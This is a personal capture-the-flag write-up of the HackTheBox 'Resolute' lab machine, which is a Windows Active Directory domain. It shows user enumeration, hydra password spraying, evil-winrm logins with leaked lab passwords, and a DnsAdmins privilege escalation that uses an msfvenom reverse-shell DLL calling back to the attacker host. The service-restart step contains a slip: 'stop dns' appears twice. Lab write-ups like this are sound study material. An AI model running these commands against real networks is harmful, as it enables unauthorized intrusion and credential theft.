---
title: "Resolute - HackTheBox"
date: 2020-06-13T17:05:44-04:00
draft: false
showToc: true
description: "My solve to the Resolute machine on hackthebox"
tags: ["htb"]
categories: ["htb"]
---

<!-- ---
layout: post
title: Resolute 
subtitle: My solve to the Resolute machine on hackthebox
image: /assets/img/resolute/resolute.png
tags: hackthebox htb
published: true
--- -->


My first medium level box for hackthebox! And my first writeup for hackthebox.

## TL;DR

User: nmap, use enum4linux to find a user password and possible usernames, use hydra to test usernames with password, use evil-winrm to gain access and cat flag.\

Root: found hidden files, found another user + password, used exploit guide on dnsadmins to gain root privileges.


## **User**

### **Getting started**

As always, I began with an nmap scan which returned the following:
```
$ nmap -sC -sV 10.10.10.169 > nmap.txt
```
```
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-20 22:33:36Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

I didn't see anything that stood out to me immediately, but I did see that port 389 was AD LDAP and port 88 was a Kerberos server. A quick google search for the Kerberos server gave me an nmap command that could enumerate possible users and names. This returned a large list of potential usernames, as I saw a huge list of users, but I was not too sure if this was the correct way. 
```
$ nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='MEGABANK.local',userdb=/root/Downloads/resolute/names.txt 10.10.10.169
```
```
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     felicia@MEGABANK.local
|     ryan@MEGABANK.local
|     claire@MEGABANK.local
|     fred@MEGABANK.local
|     per@MEGABANK.local
|     stevie@MEGABANK.local
|     zach@MEGABANK.local
|     sunita@MEGABANK.local
|     steve@MEGABANK.local
NSE Timing: About 94.32% done; ETC: 18:26 (0:00:02 remaining)
Stats: 0:03:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
|     marko@MEGABANK.local
|     abigail@MEGABANK.local
|     gustavo@MEGABANK.local
|     naoki@MEGABANK.local
|     simon@MEGABANK.local
|     Administrator@MEGABANK.local
|     sally@MEGABANK.local
|     angela@MEGABANK.local
|     paulo@MEGABANK.local
|     marcus@MEGABANK.local
|     melanie@MEGABANK.local
|     annika@MEGABANK.local
|     ulf@MEGABANK.local
|     claude@MEGABANK.local
|_    annette@MEGABANK.local
```


Although we did find some possible usernames for the MEGABANK Kerberos server, I decided against using it as I was not familiar with it. Further google-fu returned a tool called enum4linux, so I promptly installed it, and ran the enumeration script with all services on the ip.
```
$ enum4linux -a 10.10.10.169
```
```
 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```

We can see that about midway, a user with the name marko created a password with Welcome123!. I tried to access the workgroup with `Marko` and `Welcome123!` using smbclient but was not granted access, seems like Marko does not use the password Welcome123!.

It did, however, pull a list of usernames that could access the domain 'MEGABANK.local'

```
Administrator
DefaultAccount
krbtgt
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

Appending all the usernames to a file called names.txt, I was able to throw hydra against the ip with the custom wordlist and the password.

```
$ hydra -L /root/Downloads/resolute/names.txt -p Welcome123! 10.10.10.169 smb
```
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-20 18:50:16
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 26 login tries (l:26/p:1), ~26 tries per task
[DATA] attacking smb://10.10.10.169:445/
[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-20 18:50:36
```

And success! The username `melanie` is valid with the password `Welcome123!`

---

### **Gaining access**

I was recommended the tool of evil-winrm from the hackthebox forums, which allowed me to connect to the box easily. 
```
$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
```
This allowed access to `melanie` on the box, giving us the user flag.
```
$ cat user.txt
0c3be45fcfe249796ccbee8d3a978540
```

---

## **Root flag**

Approaching the root flag is always a trivial task. I navigated around for a while, attempting to use `ls -a` and `ls -l`, but was told to use `ls -hidden` instead. I kept on navigating through every directory while using `ls -hidden` and found `PSTranscript` in home.\
Within the `PSTranscript` directory, was another directory called `20191203`, which contained `PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt` as file

Using `cat` on file showed the following:

```
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
``` 

I also see another user as `ryan`, and password of `Serv3r4Admin4cc123!`, so I attempted to log backin with evil-winrm with ryan's credentials.

``` 
$ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
```

evil-winrm seemed to let me in, so I decided to check the groups available to Ryan.
```
whoami /groups
```

This returned a bunch of groups so I started to google every single group until I landed on DnsAdmins

```
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
```

A quick google search on DnsAdmins provided a well-written exploit guide, through [this](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)
 

### **Creating our payload and using it**

For the privesc payload, I used msfvenom as outlined in the exploit guide to create my payload. The dll file can be created with the following command:

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.15.104 LPORT=4444 -f dll > privesc.dll`
```

After the payload was created, I setup an nc listener with `nc -lvnp 4444` in another window

```
nc -lvnp 4444
```

To get the dll file onto the remote machine, I used `impacket` to host the dll file on my host machine, and then used `dnscmd.exe` as ryan to take the hosted dll.

```
sudo python3 smbserver.py -smb2support share ./

dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.15.104\share\privesc.dll
```

As ryan again, I stopped and started the dns service for the injected dll to take effect.
```
sc.exe \\10.10.10.169 stop dns
sc.exe \\10.10.10.169 stop dns
```

This should start the reverse shell back to our listener, providing us root access to the box. Check with `whoami` and you should get administrator back. 

Navigate to the root desktop, and the root.txt should be there.

## **What did I learn?**
- enum4linux
- How to use evil-winrm
- How to use impacket to host a file on a server
- A little bit of powershell